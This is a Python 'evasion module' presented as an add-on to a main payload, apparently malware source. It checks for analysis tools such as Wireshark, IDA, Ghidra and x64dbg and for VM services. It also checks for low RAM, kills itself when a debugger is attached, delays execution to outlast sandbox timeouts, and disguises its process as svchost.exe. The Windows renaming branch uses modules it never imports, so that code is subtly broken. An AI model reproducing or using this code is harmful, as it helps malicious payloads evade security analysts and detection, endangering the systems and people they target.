# ==================== EVASION MODULE ====================
# sandbox_check.py - Add to main payload

import ctypes
import os
import platform
import time

def is_sandbox():
    """Detect common sandbox/analysis environments."""
    checks = {
        'sandbox_procs': False,
        'low_specs': False,
        'no_user_activity': False,
    }
    
    # Check for analysis tools
    blacklist = ['wireshark', 'procmon', 'procexp', 'ida', 'x64dbg',
                 'ghidra', 'fiddler', 'charles', 'vmtoolsd', 'vboxservice']
    try:
        import psutil
        for proc in psutil.process_iter(['name']):
            pname = proc.info['name'].lower()
            if any(bl in pname for bl in blacklist):
                checks['sandbox_procs'] = True
    except:
        pass
    
    # Check RAM (sandboxes typically have <4GB)
    try:
        import psutil
        if psutil.virtual_memory().total < 4 * 1024**3:
            checks['low_specs'] = True
    except:
        pass
    
    return any(checks.values())

def anti_debug():
    """Prevent debuggers from attaching (Windows)."""
    if platform.system() == 'Windows':
        try:
            is_dbg = ctypes.windll.kernel32.IsDebuggerPresent()
            if is_dbg:
                os._exit(1)
        except:
            pass

def delayed_execution(seconds=120):
    """Delay execution to skip sandbox timeouts (default 2 min)."""
    time.sleep(seconds)

def spoof_process_name(target_name="svchost.exe"):
    """On Linux, change process name via /proc/self/comm or prctl."""
    if platform.system() == 'Linux':
        try:
            with open('/proc/self/comm', 'w') as f:
                f.write(target_name.replace('.exe', ''))
        except:
            pass
        try:
            import ctypes
            libc = ctypes.CDLL("libc.so.6")
            libc.prctl(15, target_name.encode(), 0, 0, 0)  # PR_SET_NAME=15
        except:
            pass
    # Windows: rename the .exe itself to look legitimate
    elif platform.system() == 'Windows':
        try:
            current = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
            parent = os.path.dirname(current)
            new_name = os.path.join(parent, target_name)
            if current != new_name and not os.path.exists(new_name):
                shutil.copyfile(current, new_name)
                subprocess.Popen([new_name], creationflags=0x00000008)  # DETACHED_PROCESS
                os._exit(0)
        except:
            pass
